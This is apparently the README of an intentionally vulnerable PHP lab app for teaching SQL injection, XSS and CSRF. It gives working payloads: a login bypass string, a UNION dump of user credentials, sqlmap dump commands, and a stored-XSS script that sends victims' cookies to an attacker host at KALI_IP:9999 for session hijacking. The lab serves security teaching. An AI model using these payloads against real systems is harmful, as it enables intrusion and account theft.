# Crime Report System — Cybersecurity Lab

Intentionally vulnerable PHP web app for demonstrating SQL Injection, XSS, and CSRF attacks.

---

## Project Structure

```
crime-report/
├── config.php          # DB connection
├── setup.sql           # DB schema + seed data
├── login.php           # SQL Injection (auth bypass)
├── dashboard.php       # Stored XSS (display)
├── post_report.php     # Stored XSS (input)
├── search.php          # SQL Injection + Reflected XSS
├── update_email.php    # CSRF (+ SQL Injection)
├── logout.php
├── steal.php           # Attacker's cookie stealer (deploy on Kali)
└── css/style.css
```

---

## Setup on Victim Machine (Mac or any LAMP/WAMP)

### Option A — MAMP (Mac)
1. Install MAMP: https://www.mamp.info
2. Copy `crime-report/` folder to `/Applications/MAMP/htdocs/`
3. Start MAMP, open phpMyAdmin at `http://localhost:8888/phpMyAdmin`
4. Create DB and import: run `setup.sql`
5. Visit: `http://localhost:8888/crime-report/login.php`

### Option B — PHP Built-in Server
```bash
cd crime-report
php -S 0.0.0.0:8080
# Visit http://localhost:8080/login.php
```
Make sure MySQL is running and edit config.php with correct credentials.

---

## Setup on Kali Linux (Attacker Machine)

```bash
git clone https://github.com/YOUR_USERNAME/crime-report.git
cd crime-report

# Install PHP + MySQL (if not present)
sudo apt install php php-mysqli mariadb-server -y
sudo service mariadb start

# Setup DB
sudo mysql -u root < setup.sql

# Run victim server
php -S 0.0.0.0:8080

# Also run attacker's cookie stealer server (separate terminal)
php -S 0.0.0.0:9999   # steal.php lives here
```

---

## Attack Demonstrations

---

### 1. SQL Injection — Authentication Bypass

**Target:** `login.php`

In the username field, type:
```
' OR '1'='1' --
```
Password: anything

**What happens:** The query becomes:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = '...'
```
The `--` comments out the password check. Login succeeds without valid credentials.

---

### 2. SQL Injection — UNION Attack (Data Extraction)

**Target:** `search.php?q=`

In the search box, enter:
```
' UNION SELECT 1,username,password,email,5,6 FROM users -- 
```

**What happens:** Dumps all usernames, passwords, and emails from the `users` table in the results.

---

### 3. sqlmap (Automated SQL Injection)

Run from Kali against the search page:
```bash
sqlmap -u "http://VICTIM_IP:8080/search.php?q=test" --dbs
sqlmap -u "http://VICTIM_IP:8080/search.php?q=test" -D crime_report --tables
sqlmap -u "http://VICTIM_IP:8080/search.php?q=test" -D crime_report -T users --dump
```

For login (POST form):
```bash
sqlmap -u "http://VICTIM_IP:8080/login.php" \
  --data="username=admin&password=test" \
  --level=3 --risk=2 -p username
```

---

### 4. XSS — Stored XSS (Cookie Theft)

**Setup:**
- Victim machine running crime-report on port 8080
- Attacker (Kali) running steal.php on port 9999

**Step 1:** Login to the app, go to "Post Report".

**Step 2:** In the Title field, paste:
```html
<script>document.location='http://KALI_IP:9999/steal.php?c='+document.cookie</script>
```

**Step 3:** Submit the report.

**Step 4:** When any user views the dashboard, their browser executes the script and sends their session cookie to the attacker's server.

**Step 5:** Check stolen cookies on Kali:
```bash
cat stolen_cookies.txt
# or visit http://KALI_IP:9999/steal.php in browser
```

**Step 6:** Use the stolen session cookie to hijack the session (in Burp or browser dev tools → Application → Cookies → edit PHPSESSID).

---

### 5. XSS — Reflected XSS

**Target:** `search.php`

In the search box:
```html
<script>alert(document.cookie)</script>
```

The search term is reflected back in the page without escaping — the script executes immediately.

---

### 6. CSRF (Burp Suite — for next lab)

**Target:** `update_email.php`

- The form has no CSRF token.
- Use Burp Suite to intercept the update email request.
- Generate a CSRF PoC HTML page (Burp → Right-click request → Engagement Tools → Generate CSRF PoC).
- Host the PoC on attacker machine.
- If the victim visits the attacker's page while logged in, their email gets changed silently.

---

## Test Credentials

| Username | Password  | Email            |
|----------|-----------|------------------|
| admin    | admin123  | admin@lab.com    |
| alice    | password1 | alice@lab.com    |
| bob      | pass456   | bob@lab.com      |

---

## ⚠️ Disclaimer

This project is **intentionally insecure** for educational purposes only.  
Do NOT deploy this on a public server or use outside of a controlled lab environment.
